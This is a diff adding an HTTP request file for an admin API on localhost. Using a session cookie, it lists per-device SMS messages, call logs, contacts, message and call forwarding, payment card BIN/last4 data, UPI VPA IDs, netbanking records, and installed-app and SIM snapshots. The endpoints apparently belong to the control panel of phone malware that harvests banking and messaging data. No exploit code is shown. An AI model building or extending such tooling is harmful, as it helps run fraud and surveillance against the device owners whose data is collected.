@@ -1,0 +1,65 @@
+@base = http://localhost:8085
+@asid = 3c648352-05fc-43d2-97be-c1dc93d0c009
+@deviceId = device-001
+@from = 2024-10-01T00:00:00Z
+@to = 2026-01-01T00:00:00Z
+
+### Admin: validate session (to see adminId and appId)
+GET http://localhost:8082/auth/session/validate
+Cookie: asid={{asid}}
+
+
+### Telemetry: list records (all devices for logged-in admin)
+GET {{base}}/telemetry/records?from={{from}}&to={{to}}&page=0&size=50
+Cookie: asid={{asid}}
+
+### Telemetry: single device
+GET {{base}}/telemetry/records?deviceId={{deviceId}}&page=0&size=50
+Cookie: asid={{asid}}
+
+### Telemetry: list full (omit page/size to fetch all)
+GET {{base}}/telemetry/records?from={{from}}&to={{to}}
+Cookie: asid={{asid}}
+
+### Messages: list (filters optional: deviceId, recipient, status, type, from, to)
+GET {{base}}/messages?deviceId={{deviceId}}&recipient=&status=&type=&from={{from}}&to={{to}}&page=0&size=50
+Cookie: asid={{asid}}
+
+### Call Logs: list (filters optional: deviceId, number, type, from, to)
+GET {{base}}/calllogs?deviceId={{deviceId}}&number=&type=&from={{from}}&to={{to}}&page=0&size=50
+Cookie: asid={{asid}}
+
+### Contacts: list (filters optional: deviceId, q)
+GET {{base}}/contacts?deviceId={{deviceId}}&q=&page=0&size=50
+Cookie: asid={{asid}}
+
+### Message Forwarding: list (filters optional: deviceId, recipient, forwardTo, status, from, to)
+GET {{base}}/messageforwarding?deviceId={{deviceId}}&recipient=&forwardTo=&status=&from=&to=&page=0&size=50
+Cookie: asid={{asid}}
+
+### Call Forwarding: list (filters optional: deviceId, subscriptionId, reason, service)
+GET {{base}}/callforwarding?deviceId={{deviceId}}&subscriptionId=&reason=&service=&page=0&size=50
+Cookie: asid={{asid}}
+
+### Cards: list (filters optional: deviceId, q (bin/last4), network)
+GET {{base}}/cards?deviceId={{deviceId}}&q=&network=&page=0&size=50
+Cookie: asid={{asid}}
+
+### VPA: list (filters optional: deviceId, q (upiId/phone))
+GET {{base}}/vpa?deviceId={{deviceId}}&q=&page=0&size=50&from={{from}}&to={{to}}
+Cookie: asid={{asid}}
+
+### Netbanking
+GET {{base}}/netbanking?deviceId={{deviceId}}&q=&page=0&size=50&from={{from}}&to={{to}}
+Cookie: asid={{asid}}
+
+### Device Apps snapshot
+GET {{base}}/state/apps?deviceId={{deviceId}}
+Cookie: asid={{asid}}
+
+### Device SIM snapshot
+GET {{base}}/state/sim?deviceId={{deviceId}}
+Cookie: asid={{asid}}
+
+### @appId = f5ba19697fa0dec5
+### @adminId = 59a8b07919e5fbe3
